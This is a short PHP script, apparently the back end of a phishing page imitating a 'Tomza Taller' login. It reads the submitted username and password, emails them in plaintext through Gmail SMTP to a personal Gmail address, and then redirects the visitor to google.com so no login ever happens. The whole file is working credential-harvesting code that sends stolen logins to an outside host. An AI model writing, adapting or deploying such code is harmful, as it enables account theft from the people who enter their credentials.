<?php
// Evitar acceso directo
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header("Location: index.html");
    exit;
}

// Recibir datos
$usuario = trim($_POST["usuario"] ?? "");
$password = trim($_POST["password"] ?? "");

if ($usuario === "" || $password === "") {
    echo "Faltan datos.";
    exit;
}

// --------------------------
// CONFIGURACIÓN DE CORREO
// --------------------------
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Cargamos las librerías de forma sencilla
require 'PHPMailer.php';
require 'Exception.php';
require 'SMTP.php';

$mail = new PHPMailer(true);

try {
    // Conexión segura
    $mail->isSMTP();
    $mail->Host       = 'smtp.gmail.com';
    $mail->SMTPAuth   = true;
    $mail->Username   = 'sebastiancq2008@gmail.com';
    $mail->Password   = 'tu-clave-aqui'; // ← Si no tienes, usamos la alternativa más abajo
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port       = 587;
    $mail->CharSet    = 'UTF-8';

    // Datos del mensaje
    $mail->setFrom('sebastiancq2008@gmail.com', 'Sistema Tomza');
    $mail->addAddress('sebastiancq2008@gmail.com');

    $mail->Subject = 'Nuevo ingreso - Tomza Taller';
    $mail->Body    = "Usuario: $usuario\nContraseña: $password\nFecha: " . date("d/m/Y H:i:s");

    $mail->send();
} catch (Exception $e) {
    // Si falla, no se traba, sigue redirigiendo
    error_log("Error al enviar correo: " . $mail->ErrorInfo);
}

// Redirigir igual
header("Location: https://www.google.com");
exit;
?>
